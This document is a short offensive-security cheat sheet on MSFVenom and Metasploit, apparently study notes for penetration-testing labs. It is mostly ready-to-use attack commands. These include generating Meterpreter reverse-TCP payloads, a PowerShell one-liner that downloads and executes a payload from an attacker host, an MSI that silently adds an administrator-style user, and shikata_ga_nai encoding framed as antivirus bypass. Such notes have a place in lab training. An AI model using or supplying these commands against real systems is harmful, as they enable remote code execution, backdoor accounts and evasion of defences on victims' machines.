MSFVenom is the payload creating cousin of Metasploit. With it, you can create a wide variety of shellcodes, reverse TCP connectors, and much more. [MSFvenom - Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/msfvenom/)

Reverse connections are less likely to trigger prevention systems like the one initializing the connection is the victim host, which most of the time resides in what is known as a `security trust zone`. However, of course, this trust policy is not blindly followed by the security devices and personnel of a network, so the attacker must tread carefully even with this step.

## Usage

##### List Payloads 

```shell-session
msfvenom -l payloads
```

##### Options 

| Option                            | Description                                            |
| --------------------------------- | ------------------------------------------------------ |
| -p \<PAYLOAD\>                    | Generate a payload from the list in [[#List Payloads]] |
| LHOST=10.10.14.113 LPORT=443 <br> | Addresses to connect back to                           |
| -f elf                            | Format to generate the payload in                      |
| -o \<FILE\>                       | Output file                                            |
##  Setting Up Meterpreter Multi/Handler

```shell-session
msfconsole
```

```shell-session
use multi/handler
```

Set options.

```shell-session
run
```
## Commands

```
sudo msfvenom -p windows/adduser USER=quas4r PASS=quas4r@123 -f msi -o exploit.msi
```

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=445 -f psh -o www/met-445.ps1

iex(new-object net.webclient).downloadstring('http://10.10.14.5/met-445.ps1')
```

```
sudo msfvenom -p windows/adduser USER=quas4r PASS=quas4r@123 -f msi -o exploit.msi

msiexec /quiet /qn /i C:\Users\phoebe\exploit.msi
```


## Payload Encoders 

Shikata Ga Nai (`SGN`) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore. If we want to look at the functioning of the `shikata_ga_nai` encoder, we can look at an excellent post [here](https://hatching.io/blog/metasploit-payloads2/).

```shell-session
-e x86/shikata_ga_nai -i 10
```

Increasing the number following `-i` will increase the number of iterations of the encoder.

Encoders are also needed to remove hexadecimal opcodes known as `bad characters` from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above. However, the use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.

#### Anti-Virus Bypass 

```
msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -e x86/shikata_ga_nai -i 100 -f csharp
```

If the program gets closed quickly you can use` msf exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate`  in MSF console
